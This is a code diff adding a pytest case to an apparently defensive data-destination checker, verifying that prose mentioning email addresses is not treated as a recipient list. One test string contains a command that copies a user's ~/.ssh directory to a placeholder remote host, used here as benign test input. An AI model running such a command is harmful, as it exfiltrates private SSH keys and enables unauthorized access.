@@ -253,3 +253,16 @@ def test_a_recorded_untrusted_destination_blocks_in_every_spelling_a_client_read
     unbind_ledger()
     assert v.wire is WireValue.UNTRUSTED_SOURCE, f"{call!r} read {v.wire.value}"
     assert should_block(v, mode=Mode.ENFORCE)
+
+
+@pytest.mark.parametrize("value", [
+    "Contact me at bob@corp.example for the details.",
+    "Ask the blue team to detect scp -r ~/.ssh a@b.example:/tmp/ within the hour.",
+    "a@b.example and c@d.example are both on the thread <",
+])
+def test_prose_that_mentions_an_address_is_not_a_recipient_list(value):
+    """Only junk or a display name may surround the mailbox in a part that does
+    not parse: an argument of prose that mentions an address names no recipient."""
+    from xaidr.value_origin import extract_destinations
+    found, _ = extract_destinations({"body": value})
+    assert [f.destination for f in found if f.destination is not None] == [], found
